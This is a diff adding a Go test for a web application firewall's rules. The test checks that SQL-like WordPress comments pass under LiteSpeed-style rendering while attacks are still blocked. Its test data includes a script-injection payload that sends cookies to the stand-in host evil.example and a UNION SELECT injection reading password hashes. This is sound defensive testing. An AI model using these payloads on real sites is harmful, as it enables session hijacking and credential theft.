@@ -1,6 +1,7 @@
 package waf
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -102,6 +103,67 @@ func TestExclusionsWithoutTagRemovalWithCRS(t *testing.T) {
 	for _, c := range cases {
 		if got := sendBody(t, "blog.example.com", c.method, c.uri, c.ctype, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
 			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
+		}
+	}
+}
+
+// TestCommentExclusionOnLiteSpeedWithCRS: LiteSpeed's engine ignores
+// ctl:ruleRemoveTargetByTag/ById (self-test, business600, 0.24.19), so the
+// comment fields' SQL injection exclusion (7700019) did nothing there and a
+// comment reading like SQL was refused. Rendered for LiteSpeed (the field
+// removals taken out, as that engine ignores them), the comment post skips
+// the SQL injection family whole; scripts in it and SQL to other scripts
+// are still refused. Rendered for Apache the field removals stay exact.
+func TestCommentExclusionOnLiteSpeedWithCRS(t *testing.T) {
+	src := os.Getenv("XG_CRS_DIR")
+	if src == "" {
+		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
+	}
+	form := "application/x-www-form-urlencoded"
+	// A reader of a programming blog quoting the tutorial's SQL.
+	sqlText := "comment=" + urlEncode(`Great post. In MySQL you can run: select * from wp_users where 1=1; and union select works too`) +
+		"&author=" + urlEncode("Ali") + "&email=ali%40example.pk&comment_post_ID=12"
+	xss := "comment=" + urlEncode(`great <script>document.location="https://evil.example/?c="+document.cookie</script>`) + "&author=Ali&email=ali%40example.pk&comment_post_ID=12"
+	browser := []string{"Referer: https://blog.example.com/tea/", "Origin: https://blog.example.com"}
+	for _, ls := range []bool{true, false} {
+		t.Run(fmt.Sprintf("litespeed=%v", ls), func(t *testing.T) { commentCase(t, src, ls, form, sqlText, xss, browser) })
+	}
+}
+
+func commentCase(t *testing.T, src string, ls bool, form, sqlText, xss string, browser []string) {
+	if os.Getenv("XG_DESTRUCTIVE_TESTS") == "1" {
+		// The previous variant's include (its cleanup only disables it).
+		os.Remove("/etc/apache2/conf-enabled/xpguard-waf.conf")
+		os.Remove("/etc/apache2/conf-available/xpguard-waf.conf")
+	}
+	{
+		m := crsManager(t, src, `{"waf":{"enabled":true,"wordpress":true,"generic":true}}`, "off", func(m *Manager) { m.liteSpeedRules = ls })
+		p := filepath.Join(m.RulesDir, "rules.conf")
+		b, err := os.ReadFile(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if ls != strings.Contains(string(b), "setvar:tx.xg_no_sqli=1,ctl:ruleRemoveTargetByTag=attack-sqli;ARGS:comment") {
+			t.Fatalf("LiteSpeed %v: comment rule %s", ls, ruleLine(string(b), IDWPCommentText))
+		}
+		// What LiteSpeed's engine does: no field removals.
+		os.WriteFile(p, regexp.MustCompile(`,?ctl:ruleRemoveTargetBy(?:Tag|Id)=[^,"]+`).ReplaceAll(b, nil), 0o644)
+		if err := exec.Command("apache2ctl", "graceful").Run(); err != nil {
+			t.Fatal(err)
+		}
+		waitApache()
+		got := sendBody(t, "blog.example.com", "POST", "/wp-comments-post.php", form, sqlText, browser...)
+		if ls && (got == 403 || got == 0) {
+			t.Errorf("LiteSpeed rules: comment reading like SQL refused (%d)", got)
+		}
+		if !ls && got != 403 {
+			t.Errorf("Apache rules without field removals: comment reading like SQL got %d (the case this fixes should show)", got)
+		}
+		if got := sendBody(t, "blog.example.com", "POST", "/wp-comments-post.php", form, xss, browser...); got != 403 {
+			t.Errorf("LiteSpeed %v: script in a comment got %d", ls, got)
+		}
+		if got := sendBody(t, "blog.example.com", "POST", "/contact.php", form, sqlText+"&id="+urlEncode("1' UNION SELECT user_pass FROM wp_users-- -"), browser...); got != 403 {
+			t.Errorf("LiteSpeed %v: SQL injection to another script got %d", ls, got)
 		}
 	}
 }
